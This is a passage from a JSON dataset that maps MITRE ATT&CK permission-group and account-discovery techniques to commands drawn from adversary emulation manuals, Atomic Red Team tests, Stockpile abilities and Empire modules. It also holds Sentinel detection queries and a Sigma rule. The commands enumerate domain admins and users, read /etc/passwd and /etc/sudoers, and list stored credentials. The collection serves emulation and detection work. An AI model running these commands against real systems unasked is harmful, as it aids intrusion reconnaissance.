"parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1069", "Built-in Windows Command": "net localgroup \"Administrators\"", "Cobalt Strike": "shell net localgroup \"Administrators\"", "Metasploit": "post/windows/gather/local_admin_search_enum", "Description": "Display the list of local administrator accounts on the workstation "}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1069", "Built-in Windows Command": "net group [\"Domain Admins\"] /domain[:DOMAIN] ", "Cobalt Strike": "net group [\"Domain Admins\"] /domain", "Metasploit": "domain_list_gen.rb\npost/windows/gather/enum_domain_group_users", "Description": "Display the list of domain administrator accounts"}}, {"Atomic Red Team Test - Permission Groups Discovery": {"attack_technique": "T1069", "display_name": "Permission Groups Discovery", "atomic_tests": [{"name": "Permission Groups Discovery", "description": "Permission Groups Discovery\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\n"}}, {"name": "Basic Permission Groups Discovery Windows", "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\n"}}, {"name": "Permission Groups Discovery PowerShell", "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"user": {"description": "User to identify what groups a user is a member of", "type": "string", "default": "administrator"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "get-localgroup\nget-ADPrincipalGroupMembership #{user} | select name\n"}}, {"name": "Elevated group enumeration using net group", "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n"}}]}}, {"Mitre Stockpile - Summary of permission and security groups": {"id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "name": "Permission Groups Discovery", "description": "Summary of permission and security groups", "tactic": "discovery", "technique": {"attack_id": "T1069", "name": "Permission Groups Discovery"}, "platforms": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}}}, {"Mitre Stockpile - Identify all local users": {"id": "feaced8f-f43f-452a-9500-a5219488abb8", "name": "Identify local users", "description": "Identify all local users", "tactic": "discovery", "technique": {"attack_id": "T1069", "name": "Permission Groups Discovery"}, "platforms": {"darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}, "windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/get_pathacl", "ATT&CK Technique #1": "T1069", "ATT&CK Technique #2": "", "Technique": "Permission Groups Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/get_pathacl\":  [\"T1069\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_object_acl", "ATT&CK Technique #1": "T1069", "ATT&CK Technique #2": "", "Technique": "Permission Groups Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_object_acl\":  [\"T1069\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/map_domain_trust", "ATT&CK Technique #1": "T1069", "ATT&CK Technique #2": "", "Technique": "Permission Groups Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/map_domain_trust\":  [\"T1069\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/get_uaclevel", "ATT&CK Technique #1": "T1069", "ATT&CK Technique #2": "", "Technique": "Permission Groups Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/get_uaclevel\":  [\"T1069\"],"}}], "command_list": ["net localgroup \"Administrators\"", "shell net localgroup \"Administrators\"", "post/windows/gather/local_admin_search_enum", "net group [\"Domain Admins\"] /domain[:DOMAIN] ", "net group [\"Domain Admins\"] /domain", "domain_list_gen.rb\npost/windows/gather/enum_domain_group_users", "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\n", "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\n", "get-localgroup\nget-ADPrincipalGroupMembership administrator | select name\n", "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n", {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, {"darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}, "windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}}, "powershell/situational_awareness/host/get_pathacl", "powershell/situational_awareness/host/get_pathacl", "powershell/situational_awareness/network/powerview/get_object_acl", "powershell/situational_awareness/network/powerview/get_object_acl", "powershell/situational_awareness/network/powerview/map_domain_trust", "powershell/situational_awareness/network/powerview/map_domain_trust", "powershell/situational_awareness/host/get_uaclevel", "powershell/situational_awareness/host/get_uaclevel"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where process_path contains \"net\"and (file_directory contains \"user\"or file_directory contains \"group\"or file_directory contains \"localgroup\")", "name": "Permission Groups Discovery"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"net.exe\"and (process_command_line contains \"*net* user*\"or process_command_line contains \"*net* group*\"or process_command_line contains \"*net* localgroup*\"or process_command_line contains \"*get-localgroup*\"or process_command_line contains \"*get-ADPrinicipalGroupMembership*\")", "name": "Permission Groups Discovery Process"}], "possible_detections": [{"data_source": {"title": "Reconnaissance Activity", "id": "968eef52-9cff-4454-8992-1e74b9cbad6c", "status": "experimental", "description": "Detects activity as \"net user administrator /domain\" and \"net group domain admins /domain\"", "references": ["https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html"], "author": "Florian Roth (rule), Jack Croock (method)", "tags": ["attack.discovery", "attack.t1087", "attack.t1069", "attack.s0039"], "logsource": {"product": "windows", "service": "security", "definition": "The volume of Event ID 4661 is high on Domain Controllers and therefore \"Audit SAM\" and \"Audit Kernel Object\" advanced audit policy settings are not configured in the recommendations for server systems"}, "detection": {"selection": [{"EventID": 4661, "ObjectType": "SAM_USER", "ObjectName": "S-1-5-21-*-500", "AccessMask": "0x2d"}, {"EventID": 4661, "ObjectType": "SAM_GROUP", "ObjectName": "S-1-5-21-*-512", "AccessMask": "0x2d"}], "condition": "selection"}, "falsepositives": ["Administrator activity", "Penetration tests"], "level": "high"}}]}, {"technique_id": "T1087", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net user [username] [/domain]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net user [username] [/domain]", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/gather/enum_ad_users\nauxiliary/scanner/smb/smb_enumusers", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "dsquery group \"ou=Domain Admins,dc=domain,dc=com\"\ndsquery user \"dc=domain,dc=com\"\ndsquery * OU=\"Domain Admins\",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description\ndsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\ndsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell dsquery group \"out=Domain Admins\",dc=domain,dc=com\"\nshell dsquery user \"dc=domain,dc=com\"\nshell dsquery * OU=\"Domain Admins\",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description\nshell dsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\nshell dsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "name": "Cobalt Strike"}, {"source": "atomics/T1087/T1087.yaml", "command": "cat /etc/passwd > /tmp/T1087.txt\ncat /tmp/T1087.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "cat /etc/sudoers > /tmp/T1087.txt\ncat /tmp/T1087.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.txt\ncat /tmp/T1087.txt 2>/dev/null\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "lastlog > /tmp/T1087.txt\ncat /tmp/T1087.txt\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "groups\nid\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "net user\nnet user /domain\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "net user\nnet user /domain\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-aduser -filter *\nget-localgroup\nnet localgroup\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "query user\n", "name": null}, {"source": "atomics/T1087/T1087.yaml", "command": "query user\n", "name": null}, {"source": "data/abilities/discovery/364ea817-bbb9-4083-87dd-94b9dba45f6f.yml", "command": {"windows": {"cmd,psh": {"command": "net user #{domain.user.name} /domain"}}}, "name": "The net utility is executed via cmd to enumerate detailed information about a specific user account."}, {"source": "data/abilities/discovery/c1cd6388-3ced-48c7-a511-0434c6ba8f48.yml", "command": {"darwin": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}, "linux": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}}, "name": "Get a list of all local users"}, {"source": "data/abilities/discovery/c7ec57cd-933e-42b6-99a4-e852a9e57a33.yml", "command": {"windows": {"cmd": {"command": "net user /domain"}}}, "name": "The net utility is executed via cmd to enumerate domain user accounts."}, {"source": "Threat Hunting Tables", "command": "Net.exe localgroup \"administrators\"", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe group \"domain admins\" /domain", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe user * /domain", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe useraccount get /ALL", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe useraccount list", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe qfe get description,installedOn /format:csv", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe process get caption,executablepath,commandline", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe service get name,displayname,pathname,startmode", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe share list", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe get-wmiobject -class \"win32_share\" -namespace \"root\\CIMV2\" -computer \"targetname\"", "name": null}, {"source": "Threat Hunting Tables", "command": "nltest.exe", "name": "parent_process"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/get_domain_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/get_domain_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/sid_to_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/sid_to_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/user_to_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/user_to_sid", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_spn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_spn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_foreign_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_location", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_gpo_location", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_localadmin_access", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_localadmin_access", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_managed_security_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/find_managed_security_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo_computer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo_computer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group_member", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_group_member", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_localgroup", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_localgroup", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_loggedon", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_loggedon", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_ou", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_ou", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/user_hunter", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/user_hunter", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_users", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/dscl_get_users", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmembers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmemberships", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groupmemberships", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_groups", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_ous", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_ous", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_userinformation", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_userinformation", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_users", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_users", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #1 - Enumerate all accounts", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat /etc/passwd > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #2 - View sudoers access", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat /etc/sudoers > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #3 - View accounts with UID 0", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "lsof $USER", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #4 - Show if a user account has ever logger in remotely", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "lastlog > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "Atomic Test #5 - Enumerate users and groups", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "groups", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "id", "name": null}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1087", "Built-in Windows Command": "net user [username] [/domain]", "Cobalt Strike": "shell net user [username] [/domain]", "Metasploit": "post/windows/gather/enum_ad_users\nauxiliary/scanner/smb/smb_enumusers", "Description": "Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users."}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1087", "Built-in Windows Command": "dsquery group \"ou=Domain Admins,dc=domain,dc=com\"\ndsquery user \"dc=domain,dc=com\"\ndsquery * OU=\"Domain Admins\",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description\ndsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\ndsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "Cobalt Strike": "shell dsquery group \"out=Domain Admins\",dc=domain,dc=com\"\nshell dsquery user \"dc=domain,dc=com\"\nshell dsquery * OU=\"Domain Admins\",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description\nshell dsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\nshell dsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "Metasploit": "", "Description": "Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is \"subdomain.domain.tld\", then your query will include \"dc=subdomain,dc=domain,dc=tld\""}}, {"Atomic Red Team Test - Account Discovery": {"attack_technique": "T1087", "display_name": "Account Discovery", "atomic_tests": [{"name": "Enumerate all accounts", "description": "Enumerate all accounts by copying /etc/passwd to another file\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "Path", "default": "/tmp/T1087.txt"}}, "executor": {"name": "sh", "command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "View sudoers access", "description": "(requires root)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "Path", "default": "/tmp/T1087.txt"}}, "executor": {"name": "sh", "elevation_required": true, "command": "cat /etc/sudoers > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "View accounts with UID 0", "description": "View accounts wtih UID 0\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "Path", "default": "/tmp/T1087.txt"}}, "executor": {"name": "sh", "command": "grep 'x:0:' /etc/passwd > #{output_file}\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"}}, {"name": "List opened files by user", "description": "List opened files by user\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "command": "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username\n"}}, {"name": "Show if a user account has ever logged in remotely", "description": "Show if a user account has ever logged in remotely\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "Path", "default": "/tmp/T1087.txt"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if lastlog command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v lastlog)\" ]; then exit 0; else exit 1;\n", "get_prereq_command": "echo \"Install lastlog on the machine to run the test.\"; exit 1;   \n"}], "executor": {"name": "sh", "command": "lastlog > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "Enumerate users and groups", "description": "Utilize groups and id to enumerate users and groups\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "command": "groups\nid\n"}}, {"name": "Enumerate users and groups", "description": "Utilize local utilities to enumerate users and groups\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n"}}, {"name": "Enumerate all accounts", "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "net user\nnet user /domain\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n"}}, {"name": "Enumerate all accounts via PowerShell", "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "net user\nnet user /domain\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-aduser -filter *\nget-localgroup\nnet localgroup\n"}}, {"name": "Enumerate logged on users via CMD", "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "query user\n"}}, {"name": "Enumerate logged on users via PowerShell", "description": "Enumerate logged on users via PowerShell. Upon exeuction, logged on users will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "query user\n"}}]}}, {"Mitre Stockpile - The net utility is executed via cmd to enumerate detailed information about a specific user account.": {"id": "364ea817-bbb9-4083-87dd-94b9dba45f6f", "name": "Account Discovery (targeted)", "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.", "tactic": "discovery", "technique": {"attack_id": "T1087", "name": "Account Discovery"}, "platforms": {"windows": {"cmd,psh": {"command": "net user #{domain.user.name} /domain"}}}}}, {"Mitre Stockpile - Get a list of all local users": {"id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "name": "Find local users", "description": "Get a list of all local users", "tactic": "discovery", "technique": {"attack_id": "T1087", "name": "Account Discovery"}, "platforms": {"darwin": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}, "linux": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}}}}, {"Mitre Stockpile - The net utility is executed via cmd to enumerate domain user accounts.": {"id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33", "name": "Account Discovery (all)", "description": "The net utility is executed via cmd to enumerate domain user accounts.", "tactic": "discovery", "technique": {"attack_id": "T1087", "name": "Account Discovery"}, "platforms": {"windows": 